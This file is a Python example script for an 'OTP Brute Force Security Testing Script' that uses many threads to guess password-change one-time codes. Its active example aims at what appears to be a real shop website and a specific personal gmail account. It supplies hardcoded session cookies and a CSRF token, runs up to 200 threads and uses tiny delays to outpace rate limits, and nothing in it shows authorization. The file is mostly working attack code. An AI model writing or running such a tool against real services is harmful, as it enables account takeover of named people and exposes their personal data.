#!/usr/bin/env python3
"""
Example usage of the OTP Brute Force Security Testing Script - Now with Multithreading!
"""

from brute_force_password_change import OTPBruteForcer
import time

def example_basic_usage():
    """Basic example of using the OTP brute forcer"""
    
    # Initialize the brute forcer with 5 threads
    email = "ariel.agra.archive@gmail.com"  # From your example
    base_url = "https://techshopbd.com"
    
    brute_forcer = OTPBruteForcer(base_url, email, max_threads=5)
    
    # Setup session with custom cookies if needed
    custom_cookies = {
        "csrftoken": "pzMrUb99bdHRYHSxcJhdf4hZEkB89dt6",
        "_ga": "GA1.1.891817179.1758869982",
        # Add other cookies as needed
    }
    brute_forcer.setup_session(custom_cookies)
    
    # Test a single OTP
    success, status, message = brute_forcer.test_otp("123456")
    print(f"Single OTP test: {success}, Status: {status}, Message: {message}")
    
    # Test common patterns only (fast)
    print("\nTesting common OTP patterns...")
    common_otps = brute_forcer.generate_common_otps()
    for otp in common_otps[:5]:  # Test first 5 for demo
        success, status, message = brute_forcer.test_otp(otp)
        print(f"OTP {otp}: {success} - {message}")
        time.sleep(0.1)  # Small delay


def example_multithreaded_brute_force():
    """Example of multithreaded brute force - MUCH FASTER!"""
    
    email = "ariel.agra.archive@gmail.com"
    base_url = "https://techshopbd.com"
    
    # Initialize with 15 threads for faster execution
    brute_forcer = OTPBruteForcer(base_url, email, max_threads=15)
    
    custom_cookies = {
        "csrftoken": "pzMrUb99bdHRYHSxcJhdf4hZEkB89dt6",
        "_ga": "GA1.1.891817179.1758869982",
        # Add other cookies as needed
    }
    brute_forcer.setup_session(custom_cookies)
    
    # Run multithreaded brute force on a smaller range for demo
    print("Running multithreaded brute force (much faster!)...")
    start_time = time.time()
    result = brute_forcer.multithreaded_brute_force(
        start_range=294000,
        end_range=295000,  # Test 2000 codes with multiple threads
        delay=0.001,  # Shorter delay per thread
        test_common_first=False,
        max_threads=200
    )
    print(f"done in {time.time() - start_time}")
    
    if result:
        print(f"Success! Valid OTP: {result}")
    else:
        print("No valid OTP found in range")


def example_smart_multithreaded():
    """Example of smart brute force with multithreading"""
    
    email = "test@example.com"
    base_url = "https://example.com"
    
    # Initialize with 20 threads for maximum speed
    brute_forcer = OTPBruteForcer(base_url, email, max_threads=20)
    brute_forcer.setup_session()
    
    # Run smart brute force with multithreading enabled
    result = brute_forcer.smart_brute_force(
        delay=0.005,  # Very short delay since we have multiple threads
        use_multithreading=True
    )
    
    if result:
        print(f"Success! Valid OTP: {result}")
    else:
        print("No valid OTP found")


def example_single_vs_multi_comparison():
    """Compare single-threaded vs multithreaded performance"""
    
    email = "test@example.com"
    base_url = "https://example.com"
    
    print("Performance Comparison: Single-threaded vs Multithreaded")
    print("=" * 60)
    
    # Single-threaded test
    print("\n1. Single-threaded brute force:")
    brute_forcer_single = OTPBruteForcer(base_url, email, max_threads=1)
    brute_forcer_single.setup_session()
    
    start_time = time.time()
    # Test small range for demo
    result_single = brute_forcer_single.brute_force(
        start_range=0,
        end_range=100,  # Small range for demo
        delay=0.01,
        test_common_first=False
    )
    single_time = time.time() - start_time
    print(f"Single-threaded time: {single_time:.2f} seconds")
    
    # Multithreaded test
    print("\n2. Multithreaded brute force:")
    brute_forcer_multi = OTPBruteForcer(base_url, email, max_threads=10)
    brute_forcer_multi.setup_session()
    
    start_time = time.time()
    # Test same range with multiple threads
    result_multi = brute_forcer_multi.multithreaded_brute_force(
        start_range=0,
        end_range=100,  # Same range
        delay=0.01,
        test_common_first=False
    )
    multi_time = time.time() - start_time
    print(f"Multithreaded time: {multi_time:.2f} seconds")
    
    if single_time > 0:
        speedup = single_time / multi_time
        print(f"\nSpeedup: {speedup:.2f}x faster with multithreading!")


def example_custom_range():
    """Example of testing a specific range with multithreading"""
    
    email = "test@example.com"
    base_url = "https://example.com"
    
    brute_forcer = OTPBruteForcer(base_url, email, max_threads=8)
    brute_forcer.setup_session()
    
    # Test specific range with multithreading
    print("Testing custom range with 8 threads...")
    result = brute_forcer.multithreaded_brute_force(
        start_range=500000, 
        end_range=502000,  # Test 2000 codes
        delay=0.02,
        test_common_first=True
    )
    
    if result:
        print(f"Found valid OTP: {result}")
    else:
        print("No valid OTP found in range")


if __name__ == "__main__":
    # print("🚀 MULTITHREADED OTP Brute Force Examples")
    # print("=" * 50)
    #
    # print("\n1. Basic Usage Example:")
    # example_basic_usage()
    
    print("\n2. Multithreaded Brute Force Example (FAST!):")
    example_multithreaded_brute_force()
    #
    # print("\n3. Smart Multithreaded Example:")
    # example_smart_multithreaded()
    #
    # print("\n4. Performance Comparison:")
    # example_single_vs_multi_comparison()
    #
    # print("\n5. Custom Range with Multithreading:")
    # example_custom_range()